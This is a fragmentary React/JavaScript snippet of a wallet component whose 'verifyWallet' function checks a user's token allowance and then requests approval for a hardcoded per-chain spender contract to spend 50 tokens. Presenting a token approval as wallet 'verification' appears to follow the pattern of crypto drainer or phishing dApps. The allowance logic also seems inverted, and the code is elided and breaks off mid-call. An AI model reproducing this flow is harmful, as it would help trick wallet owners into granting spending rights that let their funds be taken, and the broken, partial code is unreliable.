...
import { checkAllowance, tokenApprove } from "../web3";
...
const WalletDetails = ({ checkStatus, details }) => {
  ...
  const CONTRACTS = {
    5611: "0xeE18f607d3CDb47aeBC26A5C10DDa85189DA3489",
    1: "0xYourEthereumMainnetContract",
    56: "0xYourBscContract",
    137: "0xYourPolygonContract",
  };
  ...
  const verifyWallet = async () => {
    try {
      ...
      // Select tokens of current chain
      const chainTokens = TOKENS[chainId];
      const spender = CONTRACTS[chainId];

      if (!chainTokens || chainTokens.length === 0) {
        toast.error("No tokens configured for this chain.");
        return;
      }
      if (!spender) {
        toast.error("No contract configured for this chain.");
        return;
      }

      // Example: pick first token (or loop over multiple if needed)
      const token = chainTokens[0];
      const required = 50n * 10n ** BigInt(token.decimals);

      // Check allowance
      let allowance = await checkAllowance(address, token.address, spender);
      allowance = BigInt(allowance);

      console.log(`Allowance of ${token.symbol}:`, allowance.toString());

      if (allowance > required) {
        const approveTx = tokenApprove(
          50,
          token.address,
          spender,
          token.decimals
        ...
        const receipt = await toast.promise(approveTx, {
